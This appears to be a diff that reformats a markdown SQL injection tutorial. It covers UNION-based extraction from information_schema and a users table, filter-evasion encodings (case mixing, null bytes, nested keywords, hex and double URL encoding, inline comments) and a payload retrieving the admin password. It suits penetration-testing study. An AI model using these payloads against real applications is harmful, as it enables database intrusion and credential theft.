@@ -137,7 +137,7 @@ __The UNION Operator__
  globally accessible table DUAL. For example:
 
 
-  >>>>  ‘ UNION SELECT NULL FROM DUAL--
+  >>  ‘ UNION SELECT NULL FROM DUAL--
 
 
 &nbsp;
@@ -170,17 +170,17 @@ __Type 1: Straightforward___
   may contain interesting information
 
 
-  __EX: Name=Matthew’%20union%20select%20table_name,column_name,null,null,
+ >> EX: Name=Matthew’%20union%20select%20table_name,column_name,null,null,
       null%20from%20information_schema.columns--__
 
-
+&nbsp;
 2- Select the required column
 
-	__Ex: Name=Matthew’%20UNION%20select%20username,password,null,null,null%20  
-	from%20users--__
+ >> Ex: Name=Matthew’%20UNION%20select%20username,password,null,null,null%20  
+   from%20users--__
 
 
-
+&nbsp;
 __Note:__
 
 The information_schema is supported by MS-SQL, MySQL, and many
@@ -192,6 +192,7 @@ __ORACLE: SELECT table_name,column_name FROM all_tab_
 	columns to retrieve information about tables and columns in the database.__
 
 
+&nbsp;
 
 3- Search for interesting pieces of inforamtion:
 
@@ -210,32 +211,34 @@ __Method 1:__  Sometimes when injecting the payload, it wont work as the url is 
 
  >> select ename,sal from emp where ename=’marcus’:
 
+&nbsp;
 
 __Encoding with ASCII__
 
-	__Ex: SELECT ename, sal FROM emp where ename=CHR(109)||CHR(97)||CHR(114)||CHR(99)||CHR(117)||CHR(115)__
+>> Ex: SELECT ename, sal FROM emp where ename=CHR(109)||CHR(97)||CHR(114)||CHR(99)||CHR(117)||CHR(115)
+&nbsp;
 
-
-	__Ex: SELECT ename, sal FROM emp WHERE ename=CHAR(109)+CHAR(97)__
+>>  SELECT ename, sal FROM emp WHERE ename=CHAR(109)+CHAR(97)
 
 
 
 __Method 2:__  if the query does not work, there might be a filter for words :
 
 
-	__Ex: 	SeLeCt
-		%00SELECT
-		SELSELECTECT
-		%53%45%4c%45%43%54
-		%2553%2545%254c%2545%2543%2554__
+>> 	SeLeCt
+>>	%00SELECT
+>>	SELSELECTECT
+>>	%53%45%4c%45%43%54
+>>	%2553%2545%254c%2545%2543%2554__
 
 
 __Method 3:__ Using SQL Comments
 
 		
-	__EX: SELECT/*foo*/username,password/*foo*/FROM/*foo*/users__
+ >> EX: SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
 
-	     __SEL/*foo*/ECT username,password FR/*foo*/OM users___
+&nbsp;
+>> SEL/*foo*/ECT username,password FR/*foo*/OM users
 
 
 
@@ -251,7 +254,7 @@ __Method 4:__ Dealing with single quotes issue:
   containing his crafted input, and then attempt to change his password. 
 
 
- __EX: ‘ or 1 in (select password from users where username=’admin’)--___
+>> EX: ‘ or 1 in (select password from users where username=’admin’)--
 
 
 &nbsp;
